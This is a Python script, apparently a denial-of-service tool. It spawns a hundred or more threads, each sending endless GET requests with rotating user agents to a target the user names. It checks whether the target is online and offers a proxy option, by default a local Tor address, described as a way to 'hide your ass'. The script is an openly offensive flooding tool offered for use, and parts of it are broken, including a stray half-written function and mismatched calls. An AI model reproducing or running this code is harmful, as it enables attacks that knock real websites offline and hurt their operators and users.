#!/usr/bin/env python
# -*- encoding: UTF-8 -*-

import threading,requests,random, sys, time, re
from optparse import OptionParser
from arts import Header
### GLOBAL VARS ###
WEB = ""                        # Target
THREADS = 100                   # Number of threads
thread_list = []                # Stores a list of active threads
config = {}                     # Stores de configuration provided by the user
success = 0                     # Count of the amount of packets succesfully send
fails = 0
user_agents = [
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
]
def address(addr):
    if re.match('^(http|https):*\.*', addr):
        return addr
    elif re.match('^www\.', addr):
        return 'http://'+addr
    elif ("//" not in addr):
        return "http://"+addr
    else:
        if ("://" in addr):
            split = addr.split(":")
            return 'http:'+split[1]
        else:
            print("[!] The address isn't valid\n Try again with http://target.com")
            sys.exit(0)
def randomAgent():
    global user_agents
    return random.choice(user_agents)
def create_threads(threads):
    global config
    header = {}
    for c in range(int(config["threads"])):
        header["user-agent"] = random.choice(user_agents)
        t = threading.Thread(target=work,args=(config["web"],header,))
        t.start()
        thread_list.append(t)
    print("[!] All threads spawned\n")

def work(addr, header):
    time.sleep(1)
    while (True):
        try:
            r = requests.get(addr, headers = header)
        except requests.exceptions.RequestException as e:
            # A serious problem happened, like an SSLError or InvalidURL
            print("Error: {}".format(e))
        refreshStatus(0) if r.status_code == 200 else None
def randomUser():
    global user_agents
    rand
def checkAddr(addr):
    try:
        req = requests.get(addr)
        return True
    except ConnectionError:
        print("Connection error")
        return False

def refreshStatus():
    global success
    success += 1
    print('[>] Number of hits: %d' % success, end="\r")

def checkInput():
    global config
    usage = "Usage: %prog -u <Target> [options]"
    parser = OptionParser(usage=usage, version = "1")
    parser.add_option("-u", "--url", dest="target", help="IP or domain of the target to scan", metavar="<target>")
    parser.add_option("-t", "--threads", dest="threads", default=100, help="Set the number of threads", metavar="<threads>")
    parser.add_option("-p", "--proxy", dest="proxy", help="Use a proxy to hide your ass", metavar="<addres>:<port>")
    parser.add_option("--v", "--verbose", action="store_true", dest="verbose", help="Show verbose")
    (params, args) = parser.parse_args()
    Header()

    # ARGs checkin
    if not params.target:
        args.print_help()
        exit(0)
    config["web"] = address(params.target)
    config["threads"] = params.threads if params.threads else 100
    config["proxy"] = params.proxy if params.proxy else {"socks5": "127.0.0.1:9050"}
    status = "online" if checkAddr(config["web"]) else "offline"
    separator = "#===========================================#"
    print("{0} \n# Target: {1}\n# Threads: {2}\n# STATUS: {3}\n{0}".format(separator,config["web"],config["threads"],status))
    if status == "offline":
        sys.exit(0)

def main():
    global config
    checkInput()
    starting_time = time.time()
    create_threads(config["threads"])
    for th in thread_list: # Espera a que acaben todos los threads
        th.join()
    print("\nTotal time: %d" % (time.time() - starting_time))

if __name__ == "__main__":
    main()
